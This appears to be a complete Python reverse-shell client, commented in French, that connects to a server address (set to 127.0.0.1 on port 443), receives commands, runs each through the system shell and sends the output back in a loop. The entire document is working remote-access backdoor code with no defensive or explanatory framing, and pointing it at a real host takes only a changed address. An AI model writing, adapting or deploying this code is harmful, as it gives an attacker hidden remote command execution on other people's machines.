#!/usr/bin/python
# coding: utf-8
# -*-coding:Latin-1 -*-
import socket
import subprocess
import os, signal

URL = "127.0.0.1" # adresse du serveur
port = 443      # port

def cmd(c):
  data = c.recv(4096)
  #si serveur envoie quit ou donnée vide, on quitte
  if data == "quit" or len(data) == 0:
    return True
  else:
    #notre process
    proc = subprocess.Popen(data,    
       shell=True,              
       stdout=subprocess.PIPE,  
       stderr=subprocess.PIPE,  
       stdin=subprocess.PIPE,   
       preexec_fn=os.setsid)
    #on récupère les données à envoyer au serveur
    stdout_value = proc.stdout.read() + proc.stderr.read()
    # on kill notre process c'est plus propre
    os.killpg(proc.pid, signal.SIGTERM)
    # on envoie si pas de "&" à la fin
    if data[:-1] != "&" :
      c.send(stdout_value)
    return False
socket_died=False
while not socket_died :
   # Création de la socket client
   client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   # Connexion au serveur
   client.connect((URL,port))
   # client en attente des ordres serveurs
   while not socket_died:
     socket_died=cmd(client)
   client.close()